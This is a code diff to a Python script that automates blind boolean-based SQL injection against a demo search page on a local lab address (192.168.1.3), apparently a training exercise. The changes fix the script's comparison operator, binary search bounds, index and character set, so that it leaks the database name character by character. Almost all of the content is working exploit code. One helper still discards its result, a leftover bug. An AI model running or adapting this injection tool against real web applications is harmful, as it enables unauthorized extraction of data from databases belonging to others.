@@ -4,15 +4,18 @@ import sys
 
 # url = "http://192.168.1.3/demo/search.php"
 
-def get_search_lt(idx, ch): 
-    return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) > '{ch}"
+def get_search_lt(idx, ch):
+    return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) < '{ch}"
 
-def get_search_eq(idx, ch): 
+def get_search_eq(idx, ch):
     return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) = '{ch}"
 
 search_eq = "alice' AND (SELECT DATABASE()) = '"
 
-url_success = "http://192.168.1.3/demo/user.php"
+
+# def url_success(addr: str):
+#     return f"http://{addr}/demo/user.php"
+# url_success = "http://192.168.1.3/demo/user.php"
 
 def encode_url(url, param):
     params = {
@@ -23,20 +26,19 @@ def encode_url(url, param):
     final_url = f"{url}?{encoded_params}"
     return final_url
 
-def is_succes(url):
-    response = requests.get(url, timeout=5.0)
-    print(response.url == url_success)
-    return response.url == url_success
+def is_success(attack_url: str):
+    response = requests.get(attack_url, timeout=5.0)
+    return response.url != attack_url
 
 
 def lower(idx, ch, url: str):
-    return is_succes(encode_url(url, get_search_lt(idx, ch)))
+    return is_success(encode_url(url, get_search_lt(idx, ch)))
 
 def eq_char(idx, ch, url: str):
-    is_succes(encode_url(url, get_search_eq(idx, ch)))
+    is_success(encode_url(url, get_search_eq(idx, ch)))
 
 def eq(name, url: str):
-    return is_succes(encode_url(url, search_eq+name))
+    return is_success(encode_url(url, search_eq+name))
 
 
 def binary_search_char(idx, alphabet, url: str):
@@ -50,17 +52,17 @@ def binary_search_char(idx, alphabet, url: str):
         if eq_char(idx, guess, url):
             return guess
         elif lower(idx, guess, url):
-            lo = mid + 1
-        else:               
             hi = mid - 1
+        else:
+            lo = mid + 1
     print("none")
     return None
 
 
 def guess_secret(url: str):
-    alphabet = "".join(chr(i) for i in range(ord('a'), ord('z') + 1))
+    alphabet = "".join(chr(i) for i in range(128))
     name = ""
-    idx = 0
+    idx = 1
 
     while True:
         if eq(name, url):
@@ -75,7 +77,7 @@ def guess_secret(url: str):
         idx += 1
 
 def main():
-    if len(sys.argv) == 1:
+    if len(sys.argv) < 2:
         address = "192.168.1.3"
     else:
         address = sys.argv[1]
